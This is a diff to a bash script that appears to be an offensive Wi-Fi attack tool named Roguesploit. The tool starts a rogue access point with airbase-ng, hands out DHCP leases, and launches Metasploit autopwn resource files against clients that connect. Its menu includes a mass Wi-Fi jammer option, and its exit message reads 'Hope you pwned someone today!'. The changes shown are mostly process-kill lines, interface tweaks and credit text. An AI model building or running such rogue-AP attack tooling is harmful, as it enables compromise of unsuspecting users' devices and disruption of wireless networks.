@@ -43,6 +43,7 @@ echo -e $red"--<[!] (Ctrl + C ) Detected, Trying To Exit... [!]>--"
 sleep 1
 echo ""
 pkill dhcpd
+pkill airmon-ng
 pkill airbase-ng
 airmon-ng stop wlan1mon
 ifconfig at0 down
@@ -73,13 +74,13 @@ autopwning1 () {
 	ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
 	touch /var/lib/dhcp/dhcpd.leases
 	dhcpd -cf dhcpd.conf at0
-	msfconsole -q -r $(pwd)/roguepwn1.rc
+	msfconsole -r $(pwd)/roguepwn1.rc
 }
 autopwning2 () {
 	ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
 	touch /var/lib/dhcp/dhcpd.leases
 	dhcpd -cf dhcpd.conf at0
-	msfconsole -q -r $(pwd)/roguepwn2.rc
+	msfconsole -r $(pwd)/roguepwn2.rc
 }
 
 #menu1
@@ -93,11 +94,14 @@ echo -e $lightgreen"       3. Start WiFi Massive Jammer"
 echo -e $lightgreen"       4. Credits"
 echo -e $lightgreen"       5. Exit"
 echo -e $lightgreen"       6. TUTORIAL"
-echo -ne $yellow"root@B4ckp0r7:"; read answer1
+echo -ne $yellow"root@roguesploit:"; read answer1
 
 if test $answer1 == '1'
 	then
 	echo -e $yellow"Starting RogueAP"
+	pkill airbase-ng
+	pkill airmon-ng
+	pkill dhcpd
 	echo -ne $green"Choose a name for your AP:" ;tput sgr0
 	read nameap
 	sleep 1
@@ -105,8 +109,7 @@ if test $answer1 == '1'
 	sleep 1
 	echo -e $yellow"Starting RogueAP on wlan1 with name $nameap"
 	sleep 2
-	sudo airmon-ng start wlan1
-	sudo airbase-ng -P -C 30 -e "$nameap" -v wlan1mon
+	sudo airbase-ng -P -C 30 -e "$nameap" -v wlan1
 	menu
 elif test $answer1 == '2'
 	then
@@ -157,11 +160,11 @@ elif test $answer1 == '4'
 	echo -e "Made by B4ckP0r7 with love, Italian Engeering"
 	echo -e $blue"   Big thanks to:"
 	echo -e $red"--<[ My friends ]>--"
-	echo -e $green"--<[ QuantumSec ]>--"
+	echo -e $green"--<[ GNU / Linux ]>--"
+	echo -e $yellow"--<[ Hackers Elite Group ]>--"
 	echo -e $white"--<[ And averyone who ever supported me ]>--"
 	echo -e $blue" Press any key to continue... "
 	read continuee
-	menu
 elif test $answer1 == '5'
 	then
 	clear
@@ -218,10 +221,13 @@ echo -e $lightgreen"       3. Start WiFi Massive Jammer"
 echo -e $lightgreen"       4. Credits"
 echo -e $lightgreen"       5. Exit"
 echo -e $lightgreen"       6. TUTORIAL"
-echo -ne $yellow"root@RogueSploit: "; read answer1
+echo -ne $yellow"root@roguesploit: "; read answer1
 
 if test $answer1 == '1'
 	then
+	pkill airbase-ng
+	pkill airmon-ng
+	pkill dhcpd
 	echo -e $yellow"Starting RogueAP"
 	echo -ne $green"Choose a name for your AP:" ;tput sgr0
 	read nameap
@@ -230,8 +236,7 @@ if test $answer1 == '1'
 	sleep 3
 	echo -e $yellow"Starting RogueAP on wlan1 with name $nameap"
 	sleep 2
-	sudo airmon-ng start wlan1
-	sudo airbase-ng -P -C 30 -e "$nameap" -v wlan1mon
+	sudo airbase-ng -P -C 30 -e "$nameap" -v wlan1
 	menu
 elif test $answer1 == '2'
 	then
@@ -282,7 +287,8 @@ elif test $answer1 == '4'
 	echo -e "Made by B4ckP0r7 with love, Italian Engeering"
 	echo -e $blue"   Big thanks to:"
 	echo -e $red"--<[ My friends ]>--"
-	echo -e $green"--<[ QuantumSec ]>--"
+	echo -e $green"--<[ GNU / Linux ]>--"
+	echo -e $yellow"--<[ Hackers Elite Group ]>--"
 	echo -e $white"--<[ And averyone who ever supported me ]>--"
 	echo -e $blue" Press any key to continue... "
 	read continuee
@@ -323,7 +329,7 @@ else
 			ifconfig at0 down
 			sleep 1
 			echo -e $yellow"--<[*] Hope you pwned someone today! [*]>--"
-			echo -e $yellow"--<[*] Thank You For Using Karmasploit B) [*]>--"
+			echo -e $yellow"--<[*] Thank You For Using Roguesploit B) [*]>--"
 			sleep 2
 			clear
 			exit
